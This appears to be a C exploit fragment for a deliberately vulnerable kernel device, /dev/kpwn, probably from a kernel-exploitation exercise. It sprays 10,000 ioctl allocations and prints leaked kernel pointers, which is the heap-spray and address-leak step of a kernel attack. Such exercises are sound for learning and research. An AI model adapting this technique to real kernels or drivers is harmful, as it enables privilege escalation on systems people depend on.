#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdint.h>

#define DEV_PATH "/dev/kpwn"
#define ADD_ANY 0xbeef
#define DEL_ANY 0x2333

struct in_args {
    uint64_t addr;
    uint64_t size;
    char *buf;
};

int main() {
    int fd = open(DEV_PATH, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const int ALLOC_COUNT = 10000;
    const size_t SIZE = 0x10;
    char payload[SIZE];
    memset(payload, 0, SIZE);
    memcpy(payload, "aaaabbbb", 8); 

    for (int i = 0; i < ALLOC_COUNT; ++i) {
        struct in_args arg;
        arg.size = SIZE;
        arg.buf = malloc(SIZE);
        if (!arg.buf) {
            perror("malloc");
            return 1;
        }
        memcpy(arg.buf, payload, SIZE);
        arg.addr = 0; 

        if (ioctl(fd, ADD_ANY, &arg) != 0) {
            perror("ioctl ADD_ANY");
            free(arg.buf);
            break;
        }


        uint64_t kernel_ptr;
        memcpy(&kernel_ptr, arg.buf, sizeof(kernel_ptr));
        printf("[+] Alloc %d: kernel ptr = %p\n", i, (void *)kernel_ptr);

        free(arg.buf);
    }

    close(fd);
    return 0;
}
